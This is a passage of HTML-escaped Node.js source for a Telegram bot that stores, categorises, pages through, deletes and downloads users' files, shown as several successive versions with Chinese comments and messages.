categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 处理按钮点击 bot.on(\u0026#34;callback_query\u0026#34;, (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } bot.answerCallbackQuery(query.id); // 收起按钮 loading }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 监听文档 bot.on(\u0026#34;document\u0026#34;, (msg) =\u0026gt; { const fileId = msg.document.file_id; const fileName = msg.document.file_name; saveFile(msg, fileId, fileName, \u0026#34;文档\u0026#34;); }); // 监听图片 bot.on(\u0026#34;photo\u0026#34;, (msg) =\u0026gt; { const photo = msg.photo[msg.photo.length - 1]; const fileId = photo.file_id; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, fileId, fileName, \u0026#34;图片\u0026#34;); }); // 监听视频 bot.on(\u0026#34;video\u0026#34;, (msg) =\u0026gt; { const fileId = msg.video.file_id; const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, fileId, fileName, \u0026#34;视频\u0026#34;); }); // /myfiles 文本列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /myfilelist [页码] 文件预览分页 bot.onText(/\\/myfilelist ?(\\d+)?/, (msg, match) =\u0026gt; { const userId = msg.from.id; const page = parseInt(match[1]) || 1; const offset = (page - 1) * PAGE_SIZE; db.all( `SELECT id, file_id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`, [userId, PAGE_SIZE, offset], async (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); bot.sendMessage(msg.chat.id, `📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）`); for (const r of rows) { const caption = `#${r.id} ${r.file_name}\\n分类：${r.category}`; if (r.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { await bot.sendPhoto(msg.chat.id, r.file_id, { caption }); } else if (r.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { await bot.sendVideo(msg.chat.id, r.file_id, { caption }); } else { await bot.sendDocument(msg.chat.id, r.file_id, {}, { filename: r.file_name }); await bot.sendMessage(msg.chat.id, caption); } } } ); }); // /search 关键字 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /getfile id bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get( `SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } } ); }); del //bot const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const token = \u0026#34;XXXTOKEN\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 预设分类 const categories = [\u0026#34;工作\u0026#34;, \u0026#34;学习\u0026#34;, \u0026#34;生活\u0026#34;, \u0026#34;其他\u0026#34;]; // 每页显示条数 const PAGE_SIZE = 5; // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n\u0026#34; + \u0026#34;/setcategory 设置分类\\n\u0026#34; + \u0026#34;/myfiles 查看最近文件(文字列表)\\n\u0026#34; + \u0026#34;/myfilelist [页码] 文件预览分页\\n\u0026#34; + \u0026#34;/search 关键字 搜索文件\\n\u0026#34; + \u0026#34;/getfile id 获取文件\\n\u0026#34; + \u0026#34;/delete id 删除文件\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 监听文档 bot.on(\u0026#34;document\u0026#34;, (msg) =\u0026gt; { const fileId = msg.document.file_id; const fileName = msg.document.file_name; saveFile(msg, fileId, fileName, \u0026#34;文档\u0026#34;); }); // 监听图片 bot.on(\u0026#34;photo\u0026#34;, (msg) =\u0026gt; { const photo = msg.photo[msg.photo.length - 1]; const fileId = photo.file_id; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, fileId, fileName, \u0026#34;图片\u0026#34;); }); // 监听视频 bot.on(\u0026#34;video\u0026#34;, (msg) =\u0026gt; { const fileId = msg.video.file_id; const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, fileId, fileName, \u0026#34;视频\u0026#34;); }); // /myfiles 文本列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /myfilelist [页码] 文件预览分页 bot.onText(/\\/myfilelist ?(\\d+)?/, (msg, match) =\u0026gt; { const userId = msg.from.id; const page = parseInt(match[1]) || 1; const offset = (page - 1) * PAGE_SIZE; db.all( `SELECT id, file_id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`, [userId, PAGE_SIZE, offset], async (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); bot.sendMessage(msg.chat.id, `📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）`); for (const r of rows) { const caption = `#${r.id} ${r.file_name}\\n分类：${r.category}`; const opts = { reply_markup: { inline_keyboard: [[{ text: \u0026#34;❌ 删除\u0026#34;, callback_data: `del_${r.id}` }]], }, }; if (r.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { await bot.sendPhoto(msg.chat.id, r.file_id, { caption, ...opts }); } else if (r.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { await bot.sendVideo(msg.chat.id, r.file_id, { caption, ...opts }); } else { await bot.sendDocument(msg.chat.id, r.file_id, {}, { filename: r.file_name }); await bot.sendMessage(msg.chat.id, caption, opts); } } } ); }); // /search 关键字 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /getfile id bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get( `SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } } ); }); // /delete id 命令删除 bot.onText(/\\/delete (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; const userId = msg.from.id; db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [id, userId], function (err) { if (err) { console.error(err); return bot.sendMessage(msg.chat.id, \u0026#34;❌ 删除失败。\u0026#34;); } if (this.changes === 0) { bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); } else { bot.sendMessage(msg.chat.id, `✅ 文件(ID=${id}) 已删除。`); } }); }); // callback_query 统一处理 bot.on(\u0026#34;callback_query\u0026#34;, (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; // 分类按钮 if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } // 删除按钮（第一步：弹出确认） if (query.data.startsWith(\u0026#34;del_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;del_\u0026#34;, \u0026#34;\u0026#34;); const confirmOpts = { reply_markup: { inline_keyboard: [ [ { text: \u0026#34;✅ 确认删除\u0026#34;, callback_data: `confirmdel_${fileId}` }, { text: \u0026#34;❌ 取消\u0026#34;, callback_data: `cancel_${fileId}` }, ], ], }, }; bot.sendMessage(chatId, `⚠️ 确认要删除文件(ID=${fileId})吗？`, confirmOpts); } // 确认删除（第二步） if (query.data.startsWith(\u0026#34;confirmdel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;confirmdel_\u0026#34;, \u0026#34;\u0026#34;); db.run( `DELETE FROM files WHERE id = ? AND user_id = ?`, [fileId, userId], function (err) { if (err) { console.error(err); return bot.sendMessage(chatId, \u0026#34;❌ 删除失败。\u0026#34;); } if (this.changes === 0) { bot.sendMessage(chatId, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); } else { bot.sendMessage(chatId, `✅ 文件(ID=${fileId}) 已删除。`); } } ); } // 取消删除 if (query.data.startsWith(\u0026#34;cancel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;cancel_\u0026#34;, \u0026#34;\u0026#34;); bot.sendMessage(chatId, `❎ 已取消删除文件(ID=${fileId})。`); } bot.answerCallbackQuery(query.id); }); Loacl DownloadFile const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const axios = require(\u0026#34;axios\u0026#34;); const token = \u0026#34;TKTKg\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 预设分类 const categories = [\u0026#34;work\u0026#34;, \u0026#34;study\u0026#34;, \u0026#34;life\u0026#34;, \u0026#34;other\u0026#34;,\u0026#34;yo\u0026#34;,\u0026#34;yo2\u0026#34;]; // 每页显示条数 const PAGE_SIZE = 5; // 本地存储根目录 const STORAGE_DIR = path.join(__dirname, \u0026#34;files\u0026#34;); if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR); // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n\u0026#34; + \u0026#34;/setcategory 设置分类\\n\u0026#34; + \u0026#34;/myfiles 查看最近文件(文字列表)\\n\u0026#34; + \u0026#34;/myfilelist [页码] 文件预览分页\\n\u0026#34; + \u0026#34;/search 关键字 搜索文件\\n\u0026#34; + \u0026#34;/getfile id 获取文件\\n\u0026#34; + \u0026#34;/delete id 删除文件\\n\u0026#34; + \u0026#34;📥 点击文件后的“下载本地”按钮可保存到服务器本地\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 下载文件到本地 async function downloadFile(fileId, fileName, category) { try { const url = await bot.getFileLink(fileId); const dir = path.join(STORAGE_DIR, category); if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); const filePath = path.join(dir, fileName); const writer = fs.createWriteStream(filePath); const response = await axios({ url, method: \u0026#39;GET\u0026#39;, responseType: \u0026#39;stream\u0026#39; }); response.data.pipe(writer); return new Promise((resolve, reject) =\u0026gt; { writer.on(\u0026#39;finish\u0026#39;, () =\u0026gt; resolve(filePath)); writer.on(\u0026#39;error\u0026#39;, reject); }); } catch (err) { console.error(\u0026#34;下载文件失败:\u0026#34;, err); throw err; } } // 统一处理消息（普通消息和转发消息） bot.on(\u0026#34;message\u0026#34;, (msg) =\u0026gt; { const hasFile = msg.document || msg.photo || msg.video; const isForward = msg.forward_from || msg.forward_from_chat; if (!hasFile) return; const typePrefix = isForward ? \u0026#34;转发\u0026#34; : \u0026#34;\u0026#34;; // 文档 if (msg.document) { saveFile(msg, msg.document.file_id, msg.document.file_name, `${typePrefix}文档`); } // 图片 if (msg.photo) { const photo = msg.photo[msg.photo.length - 1]; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, photo.file_id, fileName, `${typePrefix}图片`); } // 视频 if (msg.video) { const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, msg.video.file_id, fileName, `${typePrefix}视频`); } }); // /myfiles 文本列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /myfilelist 分页显示 async function sendFilePage(chatId, userId, page = 1, messageId = null) { const offset = (page - 1) * PAGE_SIZE; db.all( `SELECT id, file_id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`, [userId, PAGE_SIZE, offset], async (err, rows) =\u0026gt; { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(chatId, \u0026#34;📭 没有找到文件。\u0026#34;); if (messageId) { await bot.editMessageText(`📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）`, { chat_id: chatId, message_id: messageId, }); } else { await bot.sendMessage(chatId, `📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）`); } for (const r of rows) { const caption = `#${r.id} ${r.file_name}\\n分类：${r.category}`; const opts = { reply_markup: { inline_keyboard: [ [{ text: \u0026#34;❌ 删除\u0026#34;, callback_data: `del_${r.id}` }], [{ text: \u0026#34;⬇️ 下载本地\u0026#34;, callback_data: `download_${r.id}` }], ], }, }; if (r.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { await bot.sendPhoto(chatId, r.file_id, { caption, ...opts }); } else if (r.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { await bot.sendVideo(chatId, r.file_id, { caption, ...opts }); } else { await bot.sendDocument(chatId, r.file_id, {}, { filename: r.file_name }); await bot.sendMessage(chatId, caption, opts); } } // 翻页按钮 const totalCountRow = await new Promise((resolve) =\u0026gt; db.get(`SELECT COUNT(*) as cnt FROM files WHERE user_id = ?`, [userId], (err, row) =\u0026gt; resolve(row)) ); const totalPages = Math.ceil(totalCountRow.cnt / PAGE_SIZE); const navOpts = { reply_markup: { inline_keyboard: [ [ { text: \u0026#34;⬅️ 上一页\u0026#34;, callback_data: `page_${page - 1}` }, { text: \u0026#34;➡️ 下一页\u0026#34;, callback_data: `page_${page + 1}` }, ], ], }, }; await bot.sendMessage(chatId, `分页导航：第 ${page}/${totalPages} 页`, navOpts); } ); } bot.onText(/\\/myfilelist ?(\\d+)?/, (msg, match) =\u0026gt; { const page = parseInt(match[1]) || 1; sendFilePage(msg.chat.id, msg.from.id, page); }); // /search 关键字 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /getfile id bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get(`SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } }); }); // /delete id bot.onText(/\\/delete (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; const userId = msg.from.id; db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [id, userId], function (err) { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(msg.chat.id, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(msg.chat.id, `✅ 文件(ID=${id}) 已删除。`); }); }); // callback_query 统一处理 bot.on(\u0026#34;callback_query\u0026#34;, async (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; // 分类按钮 if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } // 删除按钮 if (query.data.startsWith(\u0026#34;del_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;del_\u0026#34;, \u0026#34;\u0026#34;); const confirmOpts = { reply_markup: { inline_keyboard: [ [ { text: \u0026#34;✅ 确认删除\u0026#34;, callback_data: `confirmdel_${fileId}` }, { text: \u0026#34;❌ 取消\u0026#34;, callback_data: `cancel_${fileId}` }, ], ], }, }; bot.sendMessage(chatId, `⚠️ 确认要删除文件(ID=${fileId})吗？`, confirmOpts); } // 确认删除 if (query.data.startsWith(\u0026#34;confirmdel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;confirmdel_\u0026#34;, \u0026#34;\u0026#34;); db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [fileId, userId], function (err) { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(chatId, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(chatId, `✅ 文件(ID=${fileId}) 已删除。`); }); } // 取消删除 if (query.data.startsWith(\u0026#34;cancel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;cancel_\u0026#34;, \u0026#34;\u0026#34;); bot.sendMessage(chatId, `❎ 已取消删除文件(ID=${fileId})。`); } // 分页按钮 if (query.data.startsWith(\u0026#34;page_\u0026#34;)) { const page = parseInt(query.data.replace(\u0026#34;page_\u0026#34;, \u0026#34;\u0026#34;)); if (page \u0026lt; 1) return bot.answerCallbackQuery(query.id, { text: \u0026#34;已经是第一页\u0026#34; }); sendFilePage(chatId, userId, page, query.message.message_id); } // 下载到本地按钮 if (query.data.startsWith(\u0026#34;download_\u0026#34;)) { const id = query.data.replace(\u0026#34;download_\u0026#34;, \u0026#34;\u0026#34;); db.get(`SELECT file_id, file_name, category FROM files WHERE id = ? AND user_id = ?`, [id, userId], async (err, row) =\u0026gt; { if (!row) return bot.sendMessage(chatId, \u0026#34;❌ 文件不存在或无权限下载。\u0026#34;); try { const filePath = await downloadFile(row.file_id, row.file_name, row.category); bot.sendMessage(chatId, `✅ 文件已下载到服务器本地：${filePath}`); } catch { bot.sendMessage(chatId, \u0026#34;❌ 下载失败，请稍后重试。\u0026#34;); } }); } bot.answerCallbackQuery(query.id); }); Mv const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const axios = require(\u0026#34;axios\u0026#34;); const token = \u0026#34;TKTK\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 预设分类 const categories = [\u0026#34;work\u0026#34;, \u0026#34;study\u0026#34;, \u0026#34;life\u0026#34;, \u0026#34;other\u0026#34;,\u0026#34;yo\u0026#34;,\u0026#34;yo2\u0026#34;]; // 每页显示条数 const PAGE_SIZE = 5; // 本地存储根目录 const STORAGE_DIR = path.join(__dirname, \u0026#34;files\u0026#34;); if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR); // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n\u0026#34; + \u0026#34;/setcategory 设置分类\\n\u0026#34; + \u0026#34;/myfiles 查看最近文件(文字列表)\\n\u0026#34; + \u0026#34;/myfilelist [页码] 文件分页显示\\n\u0026#34; + \u0026#34;/search 关键字 搜索文件\\n\u0026#34; + \u0026#34;/getfile id 获取文件\\n\u0026#34; + \u0026#34;/delete id 删除文件\\n\u0026#34; + \u0026#34;📥 点击文件后的“下载本地”按钮可保存到服务器本地\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 下载文件到本地（带重试和日志） async function downloadFile(fileId, fileName, category, retries = 3) { const dir = path.join(STORAGE_DIR, category); if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); const filePath = path.join(dir, fileName); for (let attempt = 1; attempt \u0026lt;= retries; attempt++) { try { console.log(`下载文件尝试 ${attempt}/${retries}：${fileName}`); const url = await bot.getFileLink(fileId); // 获取文件链接 const writer = fs.createWriteStream(filePath); const response = await axios({ url, method: \u0026#39;GET\u0026#39;, responseType: \u0026#39;stream\u0026#39;, timeout: 30000 // 30秒超时 }); response.data.pipe(writer); await new Promise((resolve, reject) =\u0026gt; { writer.on(\u0026#39;finish\u0026#39;, resolve); writer.on(\u0026#39;error\u0026#39;, reject); }); console.log(`✅ 文件下载成功：${filePath}`); return filePath; } catch (err) { console.error(`❌ 下载文件失败（尝试 ${attempt}）：${fileName}`, err); if (attempt === retries) { throw new Error(`下载文件失败，请稍后重试：${fileName}`); } // 等待 1 秒后重试 await new Promise(res =\u0026gt; setTimeout(res, 1000)); } } } // 统一处理消息（普通消息和转发消息） bot.on(\u0026#34;message\u0026#34;, (msg) =\u0026gt; { const hasFile = msg.document || msg.photo || msg.video; const isForward = msg.forward_from || msg.forward_from_chat; if (!hasFile) return; const typePrefix = isForward ? \u0026#34;转发\u0026#34; : \u0026#34;\u0026#34;; // 文档 if (msg.document) { saveFile(msg, msg.document.file_id, msg.document.file_name, `${typePrefix}文档`); } // 图片 if (msg.photo) { const photo = msg.photo[msg.photo.length - 1]; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, photo.file_id, fileName, `${typePrefix}图片`); } // 视频 if (msg.video) { const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, msg.video.file_id, fileName, `${typePrefix}视频`); } }); // /myfiles 文本列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // /myfilelist 分页显示（优化：支持图片缩略图） async function sendFilePage(chatId, userId, page = 1, messageId = null) { const offset = (page - 1) * PAGE_SIZE; db.all( `SELECT id, file_id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`, [userId, PAGE_SIZE, offset], async (err, rows) =\u0026gt; { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(chatId, \u0026#34;📭 没有找到文件。\u0026#34;); // 拼接文件列表文字 let text = `📑 第 ${page} 页（每页 ${PAGE_SIZE} 条）\\n\\n`; const inline_keyboard = []; const mediaGroup = []; for (const r of rows) { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; // 